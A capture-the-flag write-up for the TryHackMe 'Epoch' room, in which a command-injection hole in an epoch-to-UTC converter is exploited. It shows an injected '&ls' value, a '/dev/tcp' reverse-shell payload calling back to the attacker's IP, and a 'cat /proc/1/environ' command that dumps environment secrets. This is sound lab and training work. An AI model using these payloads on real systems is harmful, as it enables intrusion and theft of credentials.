# TryHackMe – Epoch Write-up

**Platform:** TryHackMe
**Room:** [Epoch](https://tryhackme.com/room/epoch)
**Topics:** Command Injection, Reverse Shell, Linux process environment variables

> **Note:** Flags and sensitive values are intentionally omitted from this write-up.

---

## Overview

The target exposes an "Epoch to UTC Converter" web app. The input field turns out to be vulnerable to command injection, which allows arbitrary command execution, a reverse shell, and ultimately reading the flag from a process's environment variables.

---

## 1. Checking the Base Functionality

I accessed the "Epoch to UTC Converter" directly. Before looking for vulnerabilities, I first checked the basic functionality to confirm the converter works as expected.

<img width="775" height="385" alt="screen1" src="https://github.com/user-attachments/assets/6d453b9b-ae11-4af0-b856-af917bb2883e" />


---

## 2. Testing for Command Injection

Since the converter worked fine, I tried to inject an additional command alongside a valid epoch timestamp. Using the following input:

```
1861864155&ls
```

the application also executed `ls` and returned the contents of the directory. This confirmed that the input field is vulnerable to **command injection**.

<img width="777" height="503" alt="screen2" src="https://github.com/user-attachments/assets/4b0cc76e-89f2-4e3a-a533-57fbbe84f8d4" />


---

## 3. Getting a Reverse Shell

With command injection confirmed, I wanted a proper reverse shell to move around the system more comfortably than with one-off injected commands. I set up a listener on my attacking machine and sent the following payload:

```
1861864155&sh -i >& /dev/tcp/192.168.155.165/4444 0>&1
```

<img width="765" height="360" alt="screen4" src="https://github.com/user-attachments/assets/b6239e07-f47d-4e78-87f3-a03db9ee6e2c" />


This worked, and I received a shell back on my listener.

<img width="941" height="656" alt="screen3" src="https://github.com/user-attachments/assets/1f6eff3b-bc32-4379-a0da-1fc86fa04560" />


---

## 4. Finding the Flag

After getting a shell, I spent some time looking around the filesystem for the flag without success, mainly because I had not read the task description carefully enough. Going back and re-reading it, I found the hint that the flag is stored in a process's **environment variables**.

I retrieved it with:

```bash
cat /proc/1/environ | tr '\0' '\n'
```

This dumped the environment variables of process 1, including the flag.

<img width="694" height="457" alt="screen5" src="https://github.com/user-attachments/assets/2840733e-d626-487a-a527-54df1030e15e" />


Room complete.

---

## Lessons Learned

- **Command injection is still common:** Any input field passed into a shell command without proper sanitization (allowlisting, escaping, or using safe APIs instead of shell calls) can be abused to run arbitrary commands.
- **A simple `&` can be enough:** No advanced payload was needed here, just chaining a second command after a valid value.
- **Reverse shells make post-exploitation easier:** A single injected command is useful, but a proper interactive shell makes navigating the filesystem much faster.
- **Read the task description carefully:** I lost time searching the filesystem by hand before noticing the hint about environment variables. Checking `/proc/<pid>/environ` is a good habit whenever a task mentions environment variables, especially for processes other than your own shell (like PID 1).

---

## Tools Used

- Web browser
- Netcat (or similar) as a reverse shell listener
- Standard Linux shell commands (`ls`, `cat`, `/proc` filesystem)
